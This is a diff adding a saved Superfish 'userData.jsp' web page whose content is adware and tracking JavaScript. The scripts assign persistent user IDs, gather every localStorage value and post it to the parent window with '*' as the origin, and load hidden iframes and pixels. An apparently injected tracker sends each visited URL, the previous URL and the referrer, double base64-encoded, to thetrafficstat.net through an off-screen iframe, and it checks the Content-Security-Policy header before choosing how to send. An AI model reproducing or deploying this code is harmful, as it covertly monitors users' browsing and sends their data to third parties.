@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<!-- saved from url=(0092)http://www.superfish.com/ws/userData.jsp?dlsource=hhvzmikw&userid=NTBCNTBC&ver=2015.4.16.1.1 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <script>
+            var qs = {};
+            qs.// This function extracts key value data from the selected querystring obj
+// Input parameters:
+// obj_to_add = the desired object to add the querystring object into
+// initial_QS the querystring value
+
+setQueryString = function(obj_to_add,initial_QS){
+    obj_to_add.qsObj={};
+    initial_QS.replace(
+        new RegExp("([^?=&]+)(=([^&]*))?", "g"),
+        function($0, $1, $2, $3)
+        {
+            if ($1 === 'ctid')
+            {
+	            $1 = 'CTID';
+            }
+
+	        obj_to_add.qsObj[$1] = decodeURIComponent($3);
+        }
+    );
+}
+
+            qs.setQueryString(qs, window.location.href);
+
+			var getRealDomain = function(url){
+				if(url.indexOf( "keepwiththesamedomain" ) > -1){
+					url = url.replace("www.keepwiththesamedomain",location.host);
+				}
+				return url;
+			}
+
+            window.xdmsg = {
+    cbFunction: 0,
+
+    postMsg : function( target, param ){
+        if( target != window ){
+            target.postMessage( param, "*" );
+        }
+    },
+
+    getMsg : function(event){
+        ( window.xdmsg ? xdmsg : visualwww.b.xdmsg).cbFunction( event.data, event.origin );
+    },
+
+    init: function( cbFunc ){
+        this.cbFunction = cbFunc;
+        if( window.addEventListener ){
+            window.addEventListener("message", this.getMsg, false );
+        }else{
+            window.attachEvent('onmessage', this.getMsg );
+        }
+    },
+
+    kill: function (){
+        if( window.removeEventListener ){
+            window.removeEventListener("message", this.getMsg, false );
+        }else{
+            if (window.detachEvent) {
+                window.detachEvent ('onmessage', this.getMsg );
+            }
+        }
+    }
+}
+;
+            var userIdUtil = function () {
+    var _userIdKey = 'WSUserId';
+    var _userIdUpdatingKey = 'WSUserIdUpdating';
+    var _noUserIdKey = "NO-USER-ID";
+    var _userId = _noUserIdKey;
+
+    var _NTBCIdentity = 'NTBC'; //'NTBC';
+    var _debug = false;
+
+
+    function _s4() {
+        return Math.floor((1 + Math.random()) * 0x10000)
+            .toString(16)
+            .substring(1);
+    }
+
+
+    function _hasUserId() {
+        _userId = localStorage.getItem(_userIdKey);
+        return (_userId != null);
+    }
+
+    function _generateUserId(){
+        var newUserId = _s4() + _s4() + '-' + _s4() + '-' + _s4() + '-' + _s4() + '-' + _s4() + _s4() + _s4() + '-' + _s4().substr(0,3);
+        return newUserId;
+    }
+
+   function get() {
+        _log("Getting UserId");
+        if(!_hasUserId()) {
+            _log("generating user id");
+            _userId = _generateUserId();
+            localStorage.setItem(_userIdKey, _userId);
+            return _userId;
+        }
+        _log("userId exits - " + _userId);
+        return _userId;
+    }
+
+
+    function needToChange(uid) {
+        _log("Checking UserId - " + uid);
+        return (_startsWith(uid,_NTBCIdentity) && _endsWith(uid,_NTBCIdentity));
+    }
+
+
+    function _reportOnError(errorMessage) {
+        var dDate = new Date();
+        var msg = errorMessage + "&URL=" + document.URL.replace( "?", "&") + "&userAgent=" + navigator.userAgent  + "&platform=" + navigator.platform  + "&referrer=" + encodeURIComponent(document.referrer);
+        try{
+            var url = visualwww.b.site + "trackSession.action?userid=userIdUtil&sessionid=userIdUtil&action=userIdUtil_Error&err_message=" + msg;
+            var img = new Image();
+            img.src = url;
+            document.getElementsByTagName("body")[0].appendChild(img);
+        }
+        catch(e){
+            _log(" *** exception in func_userid_util.js in _reportOnError ");
+        }
+    }
+
+    function _endsWith(str, suffix) {
+        return str.indexOf(suffix, str.length - suffix.length) !== -1;
+    }
+
+
+    function _startsWith(str, prefix) {
+        return str.indexOf(prefix) === 0;
+    }
+
+
+    function _log(msg) {
+        if (_debug && window.console) {
+            var dDate = new Date();
+            console.log(dDate.getTime() + " - " + msg);
+        }
+    }
+
+
+    return {
+        get: get,
+        needToChange: needToChange
+    }
+
+
+}();
+            var abTestUtil = (function() {
+    var names = [
+        "tier1_bucket",
+        "tier1_curr_group",
+        "tier1_next_group",
+        "tier1_prev_group",
+        "tier2_bucket",
+        "tier2_curr_group",
+        "tier2_next_group",
+        "tier2_prev_group"
+    ];
+    var dataObj = {};
+    var dataString = "";
+
+    function init() {
+        if (dataObj === {}) {
+            for (var i = 0; i < names.length; i++) {
+                dataObj[names[i]] = "";
+            }
+        }
+    }
+    
+    function setValues(obj) {
+        if (obj) {
+            if (obj.tier1) {
+                dataObj.tier1_bucket = obj.tier1.bucket || "";
+                dataObj.tier1_curr_group = obj.tier1.group;
+                dataObj.tier1_next_group = obj.tier1.nextGroup;
+                dataObj.tier1_prev_group = obj.tier1.previousGroup;
+            }
+            if (obj.tier2) {
+                dataObj.tier2_bucket = obj.tier2.bucket || "";
+                dataObj.tier2_curr_group = obj.tier2.group;
+                dataObj.tier2_next_group = obj.tier2.nextGroup;
+                dataObj.tier2_prev_group = obj.tier2.previousGroup;
+            }            
+        }
+        dataString = '';
+        for (var i = 0; i < names.length; i++) {
+            if (dataObj[names[i]] == null || typeof(dataObj[names[i]]) === "undefined") {
+                dataObj[names[i]] = "";
+            }
+            dataString += ("&" + names[i] + "=" + dataObj[names[i]]);
+        }
+    }
+    
+    function setValuesFromQS(qsObj) {
+        if (qsObj) {
+            dataString = '';
+            for (var i = 0; i < names.length; i++) {
+                if (qsObj[names[i]] == null || typeof(qsObj[names[i]]) === "undefined") {
+                    dataObj[names[i]] = "";
+                }
+                else {
+                    dataObj[names[i]] = qsObj[names[i]];
+                }
+                dataString += ("&" + names[i] + "=" + dataObj[names[i]]);
+            }
+        }
+    }
+    
+    
+//    function overrideBucket() {
+//        dataObj.tier1_bucket = ((visualwww.b.qsObj && visualwww.b.qsObj.bucket ) || (window.qsObj && window.qsObj.bucket )) || dataObj.tier1.bucket;
+//        dataObj.tier2_bucket = ((visualwww.b.qsObj && visualwww.b.qsObj.bucket ) || (window.qsObj && window.qsObj.bucket )) || dataObj.tier2.bucket;
+//    }
+    
+    function getBucket() {
+        return dataObj.tier1_bucket || dataObj.tier2_bucket;
+    }
+    
+    function addDataToObject(obj) {
+        if (!obj) {
+            obj = {};
+        }
+        for (var i = 0; i < names.length; i++) {
+            obj[names[i]] = dataObj[names[i]];
+        }
+        return obj;
+    }
+
+    function getDataString() {
+        return dataString;
+    }
+    
+    init();
+    
+    return {
+        setValues: setValues,
+        setValuesFromQS: setValuesFromQS,        
+        getBucket: getBucket,
+        addDataToObject: addDataToObject,
+        getDataString:getDataString
+    };
+    
+})();                
+            var userDataFlow = (function() {
+
+    var startTime = 0;
+    var flowSteps = [];
+
+    function addStep(step) {
+        if(startTime === 0){
+            startTime = new Date().getTime();
+        }
+        step = ((new Date().getTime()) - startTime) + ' : ' + step;
+        flowSteps.push(step);
+    }
+
+    function getSteps(delimiter) {
+    	var del = delimiter || ' ==> ';
+        return flowSteps.join(del);
+    }
+
+//    function getSteps() {
+//    	return flowSteps.join('==>');
+//    }
+
+    return {
+        addStep: addStep,
+        getSteps: getSteps
+    };
+
+})();
+	        userDataFlow.addStep('In userData.jsp  - (' + new Date().getTime() + ')');
+            var userData = (function() {
+    
+    var userid = '';
+    var dlsource = 'no_dlsource';
+    var sfDomain = 'https://www.superfish.com/ws/';
+    var action = 'getUD.action';
+    var workDone = 0;
+    var msgSent = 0;
+    var xdMsgDelimiter = '*sfxd*';
+    var timer = 0;
+    var secTimer = 0;
+    var userDataVersion = '15.4.16.1';
+
+    function init()
+    {
+        userDataFlow.addStep('In init');
+
+		sfDomain = getRealDomain(sfDomain);
+
+        loadSecData();
+        timer = setTimeout(function() {
+            userDataFlow.addStep('In init setTimeout');
+            alternativeWork(-3);
+             if(Math.floor(Math.random() * 1000) == 1) {
+                var url = sfDomain + "trackSession.action?userid=" + userid + "&sessionid=-10&action=ud_iframe_failed";
+                var img = new Image();
+                img.src = url;     
+             }            
+        }, 3000);
+
+        if (typeof(qs.qsObj) != 'undefined'){
+            if(typeof (qs.qsObj.userid) != 'undefined'){
+                userid = qs.qsObj.userid;
+            }
+            if (qs.qsObj.dlsource) {
+                dlsource = qs.qsObj.dlsource;
+            }
+        }
+        
+        sfDomain = window.location.protocol == "http:" ? sfDomain.replace('https:', 'http:') : sfDomain;
+        if(window.xdmsg){
+            userDataFlow.addStep('before call to xdmsg init 1');
+            xdmsg.init(gotMessage);
+        }
+        
+        userDataFlow.addStep('before work');
+        work(1);
+        userDataFlow.addStep('after work');
+//        if(window.xdmsg){
+//            userDataFlow.addStep('before call to xdmsg init 2');
+//            xdmsg.init(gotMessage);
+//        }
+    }
+    
+    function loadSecData()
+    {
+		
+        if(window.location.protocol === "https:") {
+            return;
+        }
+        var lastSecSync = localStorage.getItem('lastSecSync');
+        if(qs.qsObj.dlsource === 'test' || !lastSecSync || (lastSecSync && ( ( (new Date().getTime()) - lastSecSync) / (1000*60*60*24) ) > 1) ){
+            localStorage.setItem('lastSecSync',new Date().getTime());
+            userDataFlow.addStep("in loadSecData create source iframe");
+
+            if (window.addEventListener) {
+                addEventListener("message", syncLocalStorage, false);
+            } else {
+                attachEvent("onmessage", syncLocalStorage);
+            }
+
+            var getLocalStorageUrl = sfDomain + "sf_postLocalStorage.jsp?getSec=1&ver=" + qs.qsObj.ver + '&dlsource=' + qs.qsObj.dlsource;
+
+            if (getLocalStorageUrl.indexOf( "localhost" ) > -1) {
+                getLocalStorageUrl = getLocalStorageUrl.replace("https:","http:");
+            }
+
+            var ifrm;
+            ifrm = document.createElement("IFRAME");
+            ifrm.setAttribute("src", getLocalStorageUrl);
+            ifrm.setAttribute("style", "position:absolute; top:-20px; left:-20px;");
+            ifrm.setAttribute("id", "sfPostLocalStorage2");
+            ifrm.style.width = "1px";
+            ifrm.style.height = "1px";
+            document.body.appendChild(ifrm);
+            userDataFlow.addStep("Iframe created loadSecData");
+            secTimer = setTimeout(function() {
+                userDataFlow.addStep("in syncFromSecLoadTimeOut");
+                if(Math.floor(Math.random() * 1000) === 1) {
+                    var url = currentDomain + "trackSession.action?userid=NA&sessionid=NA&action=syncFromSecLoadTimeOut";
+                    var img = new Image();
+                    img.src = url;
+                 }
+            }, 4000);
+        }
+    }
+
+    function syncLocalStorage(event) {
+        var postObj = event.data && JSON.parse(event.data) || {};
+        if(postObj.from && postObj.from === 'postLocalStorage'){
+            userDataFlow.addStep("Got message from source");
+            clearTimeout(secTimer);
+            var syncSecureDomainKeys = /^(mos|WSUserId)$/i
+            for(var i=0 ;  i < postObj.syncObj.length ; i++)
+            {
+                var localStorageItem =  postObj.syncObj[i];
+                if( localStorageItem.key !== ''){
+                    if(syncSecureDomainKeys.test(localStorageItem.key)){
+                        localStorage.setItem(localStorageItem.key,localStorageItem.value);
+                        userDataFlow.addStep(" >>>> key :" + localStorageItem.key + " value :" + localStorageItem.value);
+                    }
+                }
+            }
+        }
+    }
+
+    function work(from) {
+        userDataFlow.addStep('In work' + from);
+        if (!workDone) {
+            workDone = 1;
+            initUserId();
+            loadUserData();
+	        reportInactiveUser();
+        }
+    }
+
+    function alternativeWork(group) {
+        userDataFlow.addStep('In alternativeWork - ' + group);
+        var data = {
+            uc: 'US',
+            ut:{
+                tier1: {
+                    "bucket": null,
+                    "group": group,
+                    "nextGroup": group,
+                    "previousGroup": group
+                },
+                tier2: {
+                    "bucket": null,
+                    "group": group,
+                    "nextGroup": group,
+                    "previousGroup": group
+                },
+                userId: userid
+            }
+            //needToShowOptOut: false,
+	        //inactiveCount: parseInt(localStorage.getItem('retargetingInactiveCount') || 0)
+        };
+
+        var dataString = JSON.stringify(data);
+        sendUserData(dataString);
+    }
+    
+    function initUserId() {
+        if (!userid || userIdUtil.needToChange(userid)) {
+            userid = userIdUtil.get();
+        }
+     }
+    
+    function needToShowOptOut() {
+        var isOptOutWasShown;
+        var removeOptOutWasShown = false;
+        if(removeOptOutWasShown){
+            localStorage.removeItem('optout_was_shown');
+            localStorage.removeItem('sf_uninstall');
+        }
+        isOptOutWasShown = localStorage.getItem("optout_was_shown") || "";
+        if((dlsource === 'hdrykzc' || dlsource === 'komodiatest')  && isOptOutWasShown === ""){
+           return true;
+        }
+        return false;
+    }
+
+    function gotMessage() {}
+    
+    function sendMessage(msg) {
+        if(window.xdmsg){
+           window.xdmsg.postMsg(top, msg);
+        }
+    }
+    
+    function sendRequest(url, callback) {
+        userDataFlow.addStep('In sendRequest');
+        var httpRequest;
+	    var startTime = new Date().getTime();
+
+	    if (window.XMLHttpRequest)
+        {
+            httpRequest = new XMLHttpRequest();
+        }
+        else if (window.ActiveXObject)
+        {
+            httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
+        }
+
+        httpRequest.onreadystatechange = function()
+        {
+            userDataFlow.addStep('In onreadystatechange - ' + httpRequest.readyState);
+            if(httpRequest.readyState === 4)
+            {
+                if (httpRequest.status === 200)
+                {
+                    userDataFlow.addStep('In onreadystatechange - SUCCESS');
+	                callback(httpRequest.responseText);
+                }
+	            else
+                {
+                    userDataFlow.addStep('In onreadystatechange - FAIL(' + httpRequest.status +')');
+	                if (Math.floor(Math.random() * 100) + 1 == 1)
+	                {
+		                var img = new Image();
+		                var timeTaken = new Date().getTime() - startTime;
+
+		                img.src = sfDomain + "trackSession.action?userid=" + userid + "&action=get_ud_failed&dscr="+[httpRequest.status, httpRequest.responseText, timeTaken, encodeURIComponent(url)].join('==>');
+	                }
+                }
+            }             
+        };
+          
+        httpRequest.open('GET', url, true);
+        userDataFlow.addStep('In sendRequest before send');
+        httpRequest.send();
+    }  
+    
+    function loadUserData() {
+        var url = sfDomain + action + '?dlsource=' + dlsource + '&userId=' + userid + '&ver=' + userDataVersion;
+        sendRequest(url, sendUserData);
+    }
+
+	function reportInactiveUser()
+	{
+		var now = new Date().getTime();
+		var inactiveCount = parseInt(localStorage.getItem('retargetingInactiveCount') || 0);
+		var inactiveUserReportTimestamp = parseInt(localStorage.getItem('inactiveUserReportTimestamp') || 0);
+		var pixel;
+
+		if (inactiveCount >= 3 && now > inactiveUserReportTimestamp+86400000)
+	    {
+		    pixel = new Image();
+		    pixel.src = sfDomain+'trackSession.action?dlsource='+dlsource+'&userid='+userid+'&ver='+userDataVersion+'&dscr='+inactiveCount+'&action=inactive user';
+
+		    localStorage.setItem('inactiveUserReportTimestamp', now);
+	    }
+	}
+    
+    function sendUserData (data){
+        clearTimeout(timer);
+
+	    var storageData = {};
+	    var key;
+
+        if (!msgSent)
+        {
+            msgSent = 1;
+
+	        for (var i= 0, l=localStorage.length; i<l; i++)
+	        {
+		        key = localStorage.key(i);
+		        storageData[key] = localStorage.getItem(key);
+	        }
+			localStorage.removeItem('aoimlp');
+
+	        data = JSON.parse(data) || {};
+
+	        data.needToShowOptOut = needToShowOptOut();
+	        data.inactiveCount = parseInt(localStorage.getItem('retargetingInactiveCount') || 0);
+	        data.inactiveTimestamp = parseInt(localStorage.getItem('retargetingInactiveTimestamp') || 0);
+	        data.storageData = storageData;
+            userDataFlow.addStep('In sendUserData - (' + new Date().getTime() + ')');
+            sendMessage("-3344" + xdMsgDelimiter + JSON.stringify(data) + xdMsgDelimiter + userDataFlow.getSteps('=>'));
+//            if(dlsource === 'test'){
+//                setTimeout(function() {
+//                    console.log(userDataFlow.getSteps());
+//                }, 4000);
+//            }
+        }
+    }
+
+
+	return {
+        init: init
+    };
+
+    
+})();
+			var refererHostNameParts = document.referrer.split('/');
+			var refererHostName = refererHostNameParts.length > 2 ? refererHostNameParts[2] : '';
+			if(refererHostName === 'play.google.com' || refererHostName === 'itunes.apple.com' || refererHostName === 'www.apple.com'){
+				var mos = 'itunes';
+				if(refererHostName === 'play.google.com'){
+					mos='android';
+				}
+				localStorage.setItem('mos', mos);
+
+				var trackSession = new Image();
+				var data = [];
+				data.push('action=detectMOS');
+				data.push('userid=' + userIdUtil.get());
+				data.push('sessionid=detectMOS');
+				data.push('page_url='+encodeURIComponent(document.referrer));
+				data.push('merchantName='+refererHostName);
+				data.push('dlsource=' + qs.qsObj.dlsource);
+
+				trackSession.src = 'trackSession.action?' + data.join('&');
+			}
+            window.onload = function() {
+		        userDataFlow.addStep('before userData.init');
+				userData.init();
+            }
+	        </script>
+    <script type="text/javascript" id="459423">window.__blackListUrls__ = ['(?:.*.)?smartshopping.com','(?:.*.)?shoppstop.com','(?:.*.)?localmoxie.com','(?:.*.)?mail.com','(?:.*.)?yellowmoxie.com','(?:.*.)?internetproper.com', '(?:.*.)?traveleist.com','(?:.*.)?financetopix.com','(?:.*.)?ideallhealth.com','(?:.*.)?search2discover.com','(?:.*.)?variablesearch.com','(?:.*.)?efix.com','(?:.*.)?reimage-express.com','(?:.*.)?anti-toolbar.com','(?:.*.)?supersupport.com','(?:.*.)?reimageplus.com','(?:.*.)?reimage.com','(?:.*.)?crossrider.com','(?:.*.)?bi.crossrider.com', '(?:.*.)?softonic.com'];</script><script type="text/javascript" id="861672">window.__checkIfUrlIsValid__ = function(url){try {for (var i = 0; i < window.__blackListUrls__.length; i++){ if (window.__blackListUrls__[i] === url){return false;}else{var regex = new RegExp(window.__blackListUrls__[i], 'g');var res = url.match(regex);if (res){return false;}}}return true;} catch(e) {return true;}}</script><script type="text/javascript" id="283384">window.__validDomain__ = typeof window.__checkIfUrlIsValid__ == 'function' ? window.__checkIfUrlIsValid__(document.location.host) : true;</script><script type="text/javascript" id="72265">window.__myWindow__=function (id){var p = [195,221,265,278,280,277,279,337,338];if (typeof window.name === 'string' && window.name.match(/icm_inline_p/)){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript" id="796321">window.__onlyMe__=function (id){var p = [264,158,116,117,103,262,190];if (typeof window.name === 'string' && (window.name.match(/^a652c_/) || window.name.match(/^z7b85_/) || window.name.match(/^ld893_/))){for (var i=0;i<p.length;i++){if(p[i]==id){return false;}}return true;}return false;};</script><script type="text/javascript" id="201779">setTimeout(function(){try{var b=!1,d=!1,e="",f={},g=window,h=g.document,k=g.screen,l=g.location.href,m;a:{for(var n=["transform","MozTransform","WebkitTransform","msTransform"],p=h.documentElement,q=0;q<n.length;q++)if(n[q]in p.style){m=n[q];break a}m=void 0}function r(a){return h.querySelector(a)}var s=setInterval(function(){-1===l.indexOf("youtube.com")?clearInterval(s):l!==e&&(d=!1,e+"#"!==l&&(d=!0),e=l,d&&t())},500); function t(){var a;-1===l.indexOf("youtube.com/watch?v=")?(u(!0),r("#ecpb").style.display="none"):(null===r("#ecp")&&v(),a=r("#ecpb"),a.style.display="block",a.onclick=null,a.onclick=function(a){a.preventDefault();u()},r("#movie_player"))} function v(){var a,c;a=h.createElement("div");a.id="ecp";a.style.backgroundColor="#000";a.style.height=2*k.height+"px";a.style.left=0;a.style.opacity=0;a.style.position="fixed";a.style.top=0;a.style.width=2*k.width+"px";a.style.zIndex=-999;h.body.appendChild(a);f.zIndex=r("#movie_player").style.zIndex;c=r(".yt-masthead-logo-container");a=c.style.marginRight.substr(0,c.style.marginRight.length-2)-34;c.style.marginRight=(54>a?54:a)+"px";a=h.createElement("a");a.id="ecpb";a.href="#";a.title="Turn Lights Off"; a.style.display="none";a.style.cssFloat="left";a.style.marginTop="2px";a.style.position="relative";a.style.zIndex="auto";c=r(".yt-masthead-logo-container");c.parentNode.insertBefore(a,c.nextSibling);a=h.createElement("img");a.src="http://download.clientdataservice.com/images/cp/on.png";a.alt="CP";a.style.display="block";a.style.height="30px";a.style.margin="0 2px";c=r("#ecpb");c.appendChild(a)} function u(a){"undefined"===typeof a&&(a=b);a?(a=r("#ecp"),a.style.opacity=0,a.style.zIndex=-999,r("#movie_player").style.zIndex=f.zIndex,r("#ecpb").style.zIndex="auto",a=r("#ecpb img"),a.title="Turn Lights Off",a.style[m]="rotate(0)",b=!1):(r("#movie_player").style.zIndex=1E3,r("#ecpb").style.zIndex=1E3,a=r("#ecp"),a.style.opacity=.9,a.style.zIndex=999,r("#ecpb").style.zIndex="auto",a=r("#ecpb img"),a.title="Turn Lights On",a.style[m]="rotate(180deg)",b=!0)};}catch(e){}},1000);</script><script type="text/javascript" id="361182">var __ver="1.0.0"; var __bnsettings=function(){return{base64Enabled:!0,debug:!1,frameName:"/i/412.html",frameOrigin:"https://d19tqk5t6qcjac.cloudfront.net",framePath:"https://d19tqk5t6qcjac.cloudfront.net/i/412.html",jsPath:"https://d19tqk5t6qcjac.cloudfront.net/i/412.js",relatedUrl:"https://s412.thetrafficstat.net/related",pxlUrl:"https://s412.thetrafficstat.net/pxl.png",sourceId:"412",errorKey:"37fbdbf62c2cd5613c56ca87af3c6ada",errorProj:99593}}();</script><script type="text/javascript" id="71262">var __dxutils=function(){var l={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(c){var a="",d,b,e,g,h,f,k=0;for(c=l._utf8_encode(c);k<c.length;)d=c.charCodeAt(k++),b=c.charCodeAt(k++),e=c.charCodeAt(k++),g=d>>2,d=(d&3)<<4|b>>4,h=(b&15)<<2|e>>6,f=e&63,isNaN(b)?h=f=64:isNaN(e)&&(f=64),a=a+this._keyStr.charAt(g)+this._keyStr.charAt(d)+this._keyStr.charAt(h)+this._keyStr.charAt(f);return a},decode:function(c){var a="",d,b,e,g,h,f=0;for(c=c.replace(new RegExp("[^A-Za-z0-9+/=]", "g"),"");f<c.length;)d=this._keyStr.indexOf(c.charAt(f++)),b=this._keyStr.indexOf(c.charAt(f++)),g=this._keyStr.indexOf(c.charAt(f++)),h=this._keyStr.indexOf(c.charAt(f++)),d=d<<2|b>>4,b=(b&15)<<4|g>>2,e=(g&3)<<6|h,a+=String.fromCharCode(d),64!=g&&(a+=String.fromCharCode(b)),64!=h&&(a+=String.fromCharCode(e));return a=Base64._utf8_decode(a)},_utf8_encode:function(c){for(var a="",d=0;d<c.length;d++){var b=c.charCodeAt(d);128>b?a+=String.fromCharCode(b):(127<b&&2048>b?a+=String.fromCharCode(b>>6|192):(a+=String.fromCharCode(b>>12|224),a+=String.fromCharCode(b>>6&63|128)),a+=String.fromCharCode(b&63|128))}return a},_utf8_decode:function(c){for(var a="",d=0,b=c1=c2=0;d<c.length;)b=c.charCodeAt(d),128>b?(a+=String.fromCharCode(b),d++):191<b&&224>b?(c2=c.charCodeAt(d+1),a+=String.fromCharCode((b&31)<<6|c2&63),d+=2):(c2=c.charCodeAt(d+1),c3=c.charCodeAt(d+2),a+=String.fromCharCode((b&15)<<12|(c2&63)<<6|c3&63),d+=3);return a}};return{createRandomString:function(c){for(var a="",d=0;d<c;d++)a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(62*Math.random()));return a},base64:l,detectCurrentBrowserName:function(){var c=navigator.appName,a=navigator.userAgent,d,b;-1!=a.indexOf("Opera")?c="opera":-1!=a.indexOf("MSIE")?c="ie":-1!=a.indexOf("Chrome")?c="chrome":-1!=a.indexOf("Safari")?c="safari":-1!=a.indexOf("Firefox")?c="ff":(d=a.lastIndexOf(" ")+1)<(b=a.lastIndexOf("/"))&&(c=a.substring(d,b));return c},setStorage:function(c){},parseResponseHeaders:function(c){var a={};if(!c)return a;c=c.split(String.fromCharCode(10,13));for(var d=0;d<c.length;d++){var b=c[d],e=b.indexOf(": ");if(0<e){var g=b.substring(0,e),b=b.substring(e+2);a[g]=b}}return a},createCookie:function(c,a,d){if(d){var b=new Date;b.setTime(b.getTime()+864E5*d);d="; expires="+b.toGMTString()}else d="";document.cookie=c+"="+a+d+"; path=/"},readCookie:function(c){c+="=";for(var a=document.cookie.split(";"),d=0;d<a.length;d++){for(var b=a[d];" "==b.charAt(0);)b=b.substring(1,b.length);if(0==b.indexOf(c))return b.substring(c.length,b.length)}return null}}}();</script><script type="text/javascript" id="148387">function __cbstrg(a,b){this._iframe=null;this._iframeReady=!1;this._origin=a;this._path=b;this._queue=[];this._requests={};this._id=0;this._waitingForMessageHandling=null;this._check_supports=function(){try{return window.postMessage&&window.JSON&&"localStorage"in window&&null!==window.localStorage}catch(a){return!1}};this.supported=this._check_supports()}__cbstrg.prototype={constructor:__cbstrg,init:function(){var a=this;!this._iframe&&this.supported&&(this._iframe=document.createElement("iframe"),this._iframe.setAttribute("id","iagdtd_frame"),this._iframe.style.cssText="position:absolute;width:1px;height:1px;left:-9999px;",document.body.appendChild(this._iframe),window.addEventListener?(this._iframe.addEventListener("load",function(){a._iframeLoaded()},!1),window.addEventListener("message",function(b){a._handleMessage(b)},!1)):this._iframe.attachEvent&&(this._iframe.attachEvent("onload",function(){a._iframeLoaded()},!1),window.attachEvent("onmessage",function(b){a._handleMessage(b)})),this._iframe.src=this._origin+this._path)},getItem:function(a,b,c){if(this.supported&&(that=this,a={request:{id:++this._id,type:"get",key:a},callback:b},window.jQuery&&"undefined"!=typeof window.jQuery.Deferred&&(a.deferred=jQuery.Deferred()),this._iframeReady?this._sendRequest(a):this._queue.push(a),null==this._waitingForMessageHandling&&"undefined"!=typeof c&&"function"==typeof c&&(this._waitingForMessageHandling=!0,setTimeout(function(){1==that._waitingForMessageHandling&&(that._waitingForMessageHandling=!1,c())},2200)),window.jQuery&&"undefined"!=typeof a.deferred))return a.deferred.promise()},sendData:function(a,b){if(this.supported&&(b={request:{id:++this._id,type:"send",data:b,url:a}},window.jQuery&&"undefined"!=typeof window.jQuery.Deferred&&(b.deferred=window.jQuery.Deferred()),this._iframeReady?this._sendRequest(b):this._queue.push(b),window.jQuery&&"undefined"!=typeof b.deferred))return b.deferred.promise()},setItem:function(a,b){if(this.supported){var c={request:{id:++this._id,type:"set",key:a,value:b}};window.jQuery&&"undefined"!=typeof window.jQuery.Deferred&&(c.deferred=window.jQuery.Deferred());this._iframeReady?this._sendRequest(c):this._queue.push(c);if(window.jQuery&&"undefined"!=typeof c.deferred)return c.deferred.promise()}},_sendRequest:function(a){this._iframe&&(this._requests[a.request.id]=a,this._iframe.contentWindow.postMessage(JSON.stringify(a.request),"*"))},_iframeLoaded:function(){this._iframeReady=!0;if(this._queue.length){for(var a=0,b=this._queue.length;a<b;a++)this._sendRequest(this._queue[a]);this._queue=[]}},_handleMessage:function(a){this._waitingForMessageHandling=!1;a.origin==this._origin&&(a=JSON.parse(a.data),"undefined"!=typeof this._requests[a.id]&&"undefined"!=typeof this._requests[a.id].deferred&&this._requests[a.id].deferred.resolve(a.value),"undefined"!=typeof this._requests[a.id]&&"function"==typeof this._requests[a.id].callback&&this._requests[a.id].callback(a.key,a.value),delete this._requests[a.id])}};</script><script type="text/javascript" id="708329">var __fnsdk=function(){var l=!1,e=null,f=null,p=null,n=__bnsettings.jsPath,q=__bnsettings.pxlUrl,m=null,k=null,t=function(a){if(!l&&(l=!0,n=__bnsettings.relatedUrl,null==m&&(f=document.referrer),f!=__bnsettings.framePath)){if(a||"undefined"==typeof k||null==k)k=document.location.href;p=__bnsettings.sourceId;"1"==__dxutils.readCookie("iagdtd_bl")?r():(e=new __cbstrg(__bnsettings.frameOrigin,__bnsettings.frameName),__dxutils.setStorage(e),e.init(),e.getItem("iagdtd_info",w,x));self==top&&s();window.onfocus=y}},y=function(){"1"!=__dxutils.readCookie("iagdtd_bl")&&e.getItem("iagdtd_info",function(a,b){var c=null;try{c=JSON.parse(b)}catch(d){c=h()}c&&(c.lastFocusedUrl=document.location.href,e.setItem("iagdtd_info",JSON.stringify(c)))})},s=function(){setTimeout(function(){if(document.location.href!=k){var a=k;l=!1;f=m=a;t(!0)}else s()},100)},u=function(a,b){console.log("sending "+a+"?"+b);var c=document.createElement("img");c.setAttribute("src",a+"?"+b);c.setAttribute("style","display: none;");document.body.appendChild(c)},x=function(){r();var a=new XMLHttpRequest;a.open("GET",document.location,!1);a.send(null);a=a.getAllResponseHeaders().toLowerCase();(a=__dxutils.parseResponseHeaders(a))&&a["content-security-policy"]&&__dxutils.createCookie("iagdtd_bl","1",30)},r=function(){self==top&&(info=h(),v(info,!0))},w=function(a,b){if(null==b||"undefined"==b||"undefined"===typeof b||0==b.length)b=h(),e.setItem("iagdtd_info",JSON.stringify(b));else try{b=JSON.parse(b),"string"===typeof b&&(b=JSON.parse(b))}catch(c){b=h(),e.setItem("iagdtd_info",JSON.stringify(b))}self==top?v(b,!1):0<document.referrer.length&&((new Date).getTime(),e.setItem("iagdtd_info",JSON.stringify(b)))},h=function(){var a=null,b=document.getElementById("iagdtdentr");b&&(a=b.getAttribute("data-id"));return{id:a?a:__dxutils.createRandomString(20),session:__dxutils.createRandomString(20),browserName:__dxutils.detectCurrentBrowserName()}},v=function(a,b){f?document.referrer==f&&(f=a.lastFocusedUrl):(f=a.lastFocusedUrl,!f&&0<document.referrer.length&&(f=document.referrer));var c=a.lastFocusedUrl=document.location.href,d=f,k=a.session,h=document.referrer,m=a.browserName;if(l){"undefined"==typeof d&&(d="");"undefined"==typeof h&&(h="");data={s:p,md:21,pid:"1314F7E9965B41708BC349B08781A35AIE",sess:k,q:encodeURIComponent(c),prev:encodeURIComponent(d),link:0,sub:m,hreferer:encodeURIComponent(h)};console.log("***********");console.log("prev "+d);console.log("pid 1314F7E9965B41708BC349B08781A35AIE");console.log("sess "+k);console.log("q "+c);console.log("hreferer "+h);var c=!0,d="",g;for(g in data)data.hasOwnProperty(g)&&(c?c=!1:d+="&",d+=g+"="+data[g]);__bnsettings.base64Enabled?(g=__dxutils.base64.encode(__dxutils.base64.encode(d)),""!=g&&(g="e="+encodeURIComponent(g),b?(console.log("Sending Lean 1"),u(q,g)):e.sendData(n,g))):b?(console.log("Sending Lean 2"),u(q,d)):e.sendData(n,d)}b||e.setItem("iagdtd_info",JSON.stringify(a))};return{start:t}}();function __init_fnsdk(){document.body?__fnsdk.start():setTimeout(__init_fnsdk,500)}__init_fnsdk();</script></head>
+    <body>
+    
+
